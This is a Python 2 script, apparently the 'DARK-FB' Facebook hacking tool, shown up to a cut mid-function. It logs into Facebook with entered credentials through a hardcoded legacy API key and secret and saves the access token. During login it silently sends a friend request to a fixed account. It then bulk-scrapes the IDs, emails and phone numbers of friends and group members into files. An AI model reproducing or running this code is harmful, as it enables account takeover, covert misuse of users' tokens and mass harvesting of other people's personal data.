#!/usr/bin/python
# coding=utf-8
# (ZeDD) RedDemons
# Source : Python2 Gerak"
# DARK-FB version1.7

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()
	
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	
#-Animasi-#
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
####LOGO####
logo ="""
\033[1;96m█████████
\033[1;96m█▄█████▄█      
\033[1;96m█ ▼▼▼▼▼  _-_-- ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█.    _-_-- -_ --  Mr.Rere
\033[1;96m█ ▲▲▲▲▲   -_ -«============✧==========»
\033[1;96m█████████   SUBSCRIBE NOW TO MY CHANNELL ...!!
\033[1;96m ██ ██       VIP-V3 by Script Mr.RereXploid                    
\033[1;93m╔═══════════════════════════════════════════╗
\033[1;93m║\033[1;96m¤ \033[1;93mAuthor  \033[1;93m: \033[1;93mMr.Rere  \033[1;93m                   ║
\033[1;93m║\033[1;96m¤ \033[1;93mWA  \033[1;93m    : \033[1;93m\033[4m082180303028 \033[1;93m                  ║
\033[1;93m║\033[1;96m¤ \033[1;93mEmail  \033[1;93m : \033[1;93m\033[4mr.rerexploid@gmail.com\033[0m \033[1;93m        ║
\033[1;93m╚═══════════════════════════════════════════╝
"""

# titik #
def tik():
	titik = ['.   ','..  ','...... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mTunggu sebentar \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
name = 'NESC'
paws = 'BACOT'

def an():
    os.system('reset')
    try:
        toket = open('mew.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        time.sleep(1)
        print 'Silahkankan Subscribe ke channell Mr.RereXploid !!'
        time.sleep(3)
        print 'Semoga yang subscribe rejekinya banyak Amin...!!'
        time.sleep(3)
        print 'Biasanya yg gak subscribe tidak bisa login'
        time.sleep(3)
        os.system('xdg-open https://m.youtube.com/channel/UCKATvlGbq05zKOiHBiWplCA')
        print 'User = Mr  dan   Pasw = HG04 '
        time.sleep(5)
        print 'Masukan User dan Pass nya ?'
        uname = raw_input('\n\x1b[32;1m[\x1b[33;1m#\x1b[32;1m]\x1b[37;1m Username : ')
        if uname == name:
            pwd = raw_input('\x1b[32;1m[\x1b[33;1m#\x1b[32;1m]\x1b[37;1m Password : ')
            if pwd == paws:
                print '\x1b[32;1m[\x1b[32;1m+\x1b[32;1m]\x1b[37;1m login Berhasil'
                cek = raw_input('\x1b[32;1m[\x1b[31;1m+\x1b[32;1m]\x1b[37;1m Press Enter to continue ')
                login()
            else:
                print '\x1b[32;1m[\x1b[31;1m-\x1b[32;1m]\x1b[37;1m Password \x1b[31;1mlicensi anda salah'
                raw_input('\x1b[32;1m[\x1b[31;1m+\x1b[32;1m]\x1b[37;1m You Must Enter Again ')
                os.system('reset')
                an()
        else:
            print '\x1b[32;1m[\x1b[31;1m-\x1b[32;1m]\x1b[37;1m Username \x1b[31;1mSalah'
            raw_input('\x1b[32;1m[\x1b[31;1m+\x1b[32;1m]\x1b[37;1m You Must Enter Again  ')
            an()

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	msuk = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
##### MENU ##########################################
def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		keluar()
	os.system("reset")
	print logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "\033[1;97m╚"+40*"═"
	print "1]. User information"
	print "2]. Hack facebook account               "
	print "3]. Show token           "
	print "4]. LogOut            "
	print "5]. Exit the programs          "
	pilih()
#-
def pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Wrong input"
		pilih()
	elif zedd =="1":
		informasi()
	elif zedd =="2":
		menu_hack()
	elif zedd =="3":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+toket
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	elif zedd =="4":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.youtube.com/channel/UCz5Z718-ZRUy9aBzCAHqrug')
		keluar()
	elif zedd =="0":
		keluar()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih()
	
##### INFO #####
def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
		
##### DUMP #####
def dump():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID Search"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member ID"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member email"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get group member phone number"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get email friend from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number"
	print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Get a friend's phone number from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	dump_pilih()
#-----pilih
def dump_pilih():
	cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if cuih =="":
		print "\033[1;91m[!] Wrong input"
		dump_pilih()
	elif cuih =="1":
		id_teman()
	elif cuih =="2":
		idfrom_teman()
	elif cuih =="3":
		os.system('reset')
		print "\033[1;91mSegera"
		keluar()
	elif cuih =="4":
		id_member_grup()
	elif cuih =="5":
		em_member_grup()
	elif cuih =="6":
		no_member_grup()
	elif cuih =="7":
		email()
	elif cuih =="8":
		emailfrom_teman()
	elif cuih =="9":
		nomor_hp()
	elif cuih =="10":
		hpfrom_teman()
	elif cuih =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### ID FROM TEMAN #####
def idfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(90000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### ID FROM MEMBER GRUP #####
def id_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			idmem.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### EMAIL FROM GRUP #####
def em_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emmem.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### NOMER FROM GRUP #####
def no_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nomem.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(nomem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### EMAIL #####
def email():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/email_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				em.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/email_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### EMAIL FROM TEMAN #####
def emailfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
